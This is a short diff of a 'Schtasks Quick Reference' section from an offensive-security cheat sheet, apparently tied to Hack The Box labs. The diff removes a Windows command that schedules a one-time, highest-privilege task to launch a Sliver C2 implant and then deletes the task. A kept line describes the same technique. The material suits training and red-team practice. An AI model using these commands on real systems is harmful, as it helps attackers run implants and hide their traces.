@@ -2,13 +2,6 @@
 
 ### Schtasks Quick Reference
 
-Dynamically schedule a task that will run one minute in the future, clean it up afterward
-
-```
-for /f "tokens=1-2 delims=:" %a in ("%time%") do schtasks /create /tn "OneShotTask" /tr "C:\Users\htb-student\Desktop\sliver.exe" /sc ONCE /st %a:%b /rl HIGHEST /f
-schtasks /delete /tn "OneShotTask" /f
-```
-
 Generate a schtask that will run once (to launch a sliver), remove it after you get your callback&#x20;
 
 ```
